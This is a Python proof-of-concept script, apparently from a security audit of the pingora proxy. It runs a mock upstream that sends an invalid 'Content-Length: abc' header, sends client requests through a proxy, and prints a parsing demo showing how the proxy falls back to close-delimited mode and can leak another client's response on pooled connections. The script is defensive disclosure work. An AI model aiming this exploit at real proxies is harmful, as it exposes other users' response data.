#!/usr/bin/env python3
"""
Finding 8 PoC: Invalid Content-Length response causes close-delimited confusion.

This script demonstrates that when allow_h1_response_invalid_content_length is
enabled and an upstream sends Content-Length: abc, the body reader falls through
to close-delimited mode, potentially reading data from subsequent responses on
pooled connections.

Usage:
    # Start mock upstream that sends invalid Content-Length
    python3 repro_invalid_cl.py --mode upstream --port 8081

    # Send requests through proxy
    python3 repro_invalid_cl.py --mode client --proxy-port 6188

    # All-in-one test (no proxy needed — demonstrates the parsing issue)
    python3 repro_invalid_cl.py --mode demo
"""

import argparse
import socket
import sys
import threading
import time


def mock_upstream_handler(conn: socket.socket, addr):
    """
    Mock upstream that sends responses with invalid Content-Length.
    On a keep-alive connection, sends two responses:
    1. Response with Content-Length: abc (invalid)
    2. Response for a different request (should be separate)
    """
    try:
        # Read the first request
        data = conn.recv(4096)
        if not data:
            return

        print(f"  [Upstream] Received request from {addr}")
        print(f"  [Upstream] {data.split(b'\\r\\n')[0]}")

        # Send response with INVALID Content-Length
        response1_body = b"This is the response body for request 1."
        response1 = (
            b"HTTP/1.1 200 OK\r\n"
            b"Content-Length: abc\r\n"  # INVALID — not a number
            b"Connection: keep-alive\r\n"
            b"X-Request: 1\r\n"
            b"\r\n"
            + response1_body
        )
        conn.sendall(response1)
        print(f"  [Upstream] Sent response 1 with Content-Length: abc")

        # Wait briefly, then read the second request on the same connection
        time.sleep(0.5)
        data2 = conn.recv(4096)
        if data2:
            print(f"  [Upstream] Received second request on same connection")
            # Send a second response — on a keep-alive connection,
            # if the proxy is in close-delimited mode from the first response,
            # it will read THIS as part of response 1's body
            response2_body = b"SECRET: This response is for a DIFFERENT client!"
            response2 = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Length: " + str(len(response2_body)).encode() + b"\r\n"
                b"Connection: close\r\n"
                b"X-Request: 2\r\n"
                b"\r\n"
                + response2_body
            )
            conn.sendall(response2)
            print(f"  [Upstream] Sent response 2 (should be for different client)")

    except Exception as e:
        print(f"  [Upstream] Error: {e}")
    finally:
        conn.close()


def run_upstream(port: int):
    """Run the mock upstream server."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("127.0.0.1", port))
    server.listen(5)
    print(f"[Upstream] Mock upstream listening on 127.0.0.1:{port}")
    print(f"[Upstream] Will send responses with Content-Length: abc")

    while True:
        conn, addr = server.accept()
        threading.Thread(target=mock_upstream_handler, args=(conn, addr), daemon=True).start()


def send_through_proxy(host: str, port: int, request_num: int = 1) -> bytes:
    """Send a request through the proxy and return the response."""
    request = (
        f"GET /test{request_num} HTTP/1.1\r\n"
        f"Host: backend.example.com\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10.0)
    try:
        sock.connect((host, port))
        sock.sendall(request)
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
            except socket.timeout:
                break
        return response
    finally:
        sock.close()


def run_client(proxy_host: str, proxy_port: int):
    """Send requests through the proxy and analyze responses."""
    print(f"\n[Client] Sending requests through proxy at {proxy_host}:{proxy_port}")

    # Send first request
    print(f"\n[Client] Request 1:")
    response1 = send_through_proxy(proxy_host, proxy_port, 1)

    if not response1:
        print("  [!] No response received")
        return

    # Parse response
    header_end = response1.find(b"\r\n\r\n")
    headers = response1[:header_end].decode(errors="replace") if header_end != -1 else ""
    body = response1[header_end + 4:] if header_end != -1 else response1

    print(f"  Response headers:\n    {headers}")
    print(f"  Response body ({len(body)} bytes): {body}")

    # Check if the response contains data from a second response
    if b"SECRET" in body or b"X-Request: 2" in body:
        print(f"\n  [!!] RESPONSE LEAK DETECTED!")
        print(f"  The response contains data from a different client's response!")
        print(f"  This confirms close-delimited mode is reading across response boundaries.")
    elif b"Content-Length: abc" in response1:
        print(f"\n  [INFO] Proxy forwarded the invalid Content-Length header")
        print(f"  Check if the body was read in close-delimited mode")


def run_demo():
    """
    Demonstrate the Content-Length parsing issue without needing a proxy.
    Shows what happens when Content-Length is not a valid integer.
    """
    print("Finding 8 Demo: Invalid Content-Length Parsing")
    print("=" * 60)

    # Simulate what pingora does with Content-Length parsing
    test_values = [
        ("123", "Valid integer"),
        ("abc", "Non-numeric — triggers fallback"),
        ("12abc", "Partially numeric"),
        ("", "Empty value"),
        ("-1", "Negative value"),
        ("999999999999999999999", "Overflow value"),
        ("12 34", "Space-separated (ambiguous)"),
        ("12, 34", "Comma-separated (ambiguous)"),
    ]

    print("\nContent-Length parsing results:")
    print(f"  {'Value':<30} {'Parse Result':<20} {'Body Mode'}")
    print(f"  {'-'*30} {'-'*20} {'-'*20}")

    for value, desc in test_values:
        try:
            parsed = int(value)
            mode = f"Content-Length ({parsed})"
        except (ValueError, OverflowError):
            parsed = None
            mode = "CLOSE-DELIMITED (fallback!)"

        print(f"  {value + ' (' + desc + ')':<30} {str(parsed):<20} {mode}")

    print()
    print("When allow_h1_response_invalid_content_length is enabled:")
    print("  - Invalid Content-Length values cause silent fallback to close-delimited mode")
    print("  - On pooled connections, this reads across response boundaries")
    print("  - The proxy may return another client's response data")
    print()
    print("Attack scenario on pooled connection:")
    print("  1. Attacker's request → upstream sends Content-Length: abc")
    print("  2. Proxy enters close-delimited mode, reads until connection close")
    print("  3. But connection is keep-alive, so proxy reads next response too")
    print("  4. Victim's response data is appended to attacker's response body")


def main():
    parser = argparse.ArgumentParser(
        description="PoC for invalid Content-Length causing close-delimited confusion"
    )
    parser.add_argument(
        "--mode",
        choices=["upstream", "client", "demo"],
        default="demo",
        help="Run mode",
    )
    parser.add_argument("--port", type=int, default=8081, help="Upstream port")
    parser.add_argument("--proxy-host", default="127.0.0.1", help="Proxy host")
    parser.add_argument("--proxy-port", type=int, default=6188, help="Proxy port")
    args = parser.parse_args()

    if args.mode == "upstream":
        run_upstream(args.port)
    elif args.mode == "client":
        run_client(args.proxy_host, args.proxy_port)
    elif args.mode == "demo":
        run_demo()


if __name__ == "__main__":
    main()
